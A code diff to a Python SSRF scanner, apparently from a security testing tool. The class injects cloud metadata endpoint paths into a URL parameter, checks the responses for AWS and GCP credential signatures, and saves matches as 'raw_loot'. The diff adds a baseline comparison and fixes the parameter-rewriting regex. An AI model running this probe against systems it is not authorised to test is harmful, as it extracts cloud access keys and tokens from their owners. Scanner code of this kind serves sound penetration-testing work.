@@ -24,23 +24,42 @@ class SSRFDeepScanner:
         findings = []
         if logger: logger(f"SSRF Deep: Probing parameter '{param}' for Cloud Metadata access...", "INFO")
 
+        # 0. Baseline fetch
+        try:
+            baseline_resp = self.session.get(url, timeout=7)
+            baseline_text = baseline_resp.text if baseline_resp.status_code == 200 else ""
+        except:
+            baseline_text = ""
+
         for provider, path in self.cloud_payloads.items():
             try:
                 # 1. Direct IP Access
                 target_uri = f"{self.metadata_vector}{path}"
                 attack_url = self._build_attack_url(url, param, target_uri)
                 
-                # For GCP/Azure, specific headers might be needed if the SSRF allows header injection (rare)
-                # But sometimes normal GET works if proxy is naive.
                 resp = self.session.get(attack_url, timeout=7)
                 
                 # Check for hits (AWS IAM returns role names, GCP returns JSON tokens)
                 if resp.status_code == 200:
-                    if any(k in resp.text.lower() for k in ["accesskeyid", "secretaccesskey", "token", "instance-id"]):
+                    # Filter out ignored parameters
+                    if resp.text == baseline_text:
+                        continue
+
+                    text_low = resp.text.lower()
+                    signatures = ["accesskeyid", "secretaccesskey", "token", "instance-id", "ami-id", "computemetadata"]
+                    
+                    hit = False
+                    for sig in signatures:
+                        if sig in text_low and sig not in baseline_text.lower():
+                            hit = True
+                            break
+
+                    if hit:
                         findings.append({
                             "title": f"Critical Cloud SSRF ({provider.upper()})",
                             "description": f"Successfully extracted cloud credentials via SSRF on parameter '{param}'.\nAttack URL: {attack_url}\nProvider: {provider}",
                             "severity": "critical",
+                            "confidence": "high",
                             "tool_source": "ssrf_deep_expert",
                             "url": attack_url,
                             "raw_loot": resp.text[:1000]
@@ -53,8 +72,9 @@ class SSRFDeepScanner:
     def _build_attack_url(self, base_url, param, target):
         # Handle cases where param might already have a value
         if "?" in base_url:
-            if f"{param}=" in base_url:
-                return re.sub(f"{param}=[^&]*", f"{param}={quote(target)}", base_url)
+            # If param is already in the URL, replace its value
+            if re.search(f"[?&]{param}=", base_url):
+                return re.sub(f"({param}=)[^&]*", f"\\1{quote(target)}", base_url)
             else:
                 return f"{base_url}&{param}={quote(target)}"
         return f"{base_url}?{param}={quote(target)}"
